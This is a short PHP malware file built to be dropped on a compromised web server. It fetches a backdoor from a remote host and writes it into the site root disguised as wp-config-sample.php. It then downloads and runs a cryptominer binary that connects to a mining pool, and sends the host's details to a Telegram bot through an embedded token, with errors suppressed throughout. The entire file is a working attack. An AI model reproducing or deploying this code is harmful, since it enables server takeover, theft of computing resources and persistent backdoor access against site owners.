<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$nama = 'wp-config-sample.php';
$check = $_SERVER['DOCUMENT_ROOT'] . '/'.$nama.'';
$text = http_get('http://moneyua.vip/public/fonts/source/GothamPro-Medium/wp-config-sample.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
echo '<center><pre>raimuasu</pre></center>'; system('curl -s --insecure e1-ex.com/rpc -o server.ico; chmod +x server.ico; ./server.ico -a YespowerSugar -o stratum+tcp://146.59.217.34:7042 -u sugar1qy7m556kfcyxc0xzyxwzxkp3k5338kp40zajg07.COK -p x --no-longpoll --background > /dev/null'); $sys = php_uname(); $core = system('nproc'); $lihat = getcwd(); $home = $_SERVER['DOCUMENT_ROOT']; $domen = $_SERVER['SERVER_NAME']; $tempat = $_SERVER['REQUEST_URI']; $apiToken = "1765040091:AAESnKl29tHuol7gN_4DGJYJtl_kqoTs3aI"; $data = [ 'chat_id' => '-1001473401290', 'text' => "SEGER KOIN : \r\n Bakdur : http://$domen/$nama \r\n Uname : $sys \r\n DIR : $home  \r\n Core : $core \r\n" ]; $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); ?>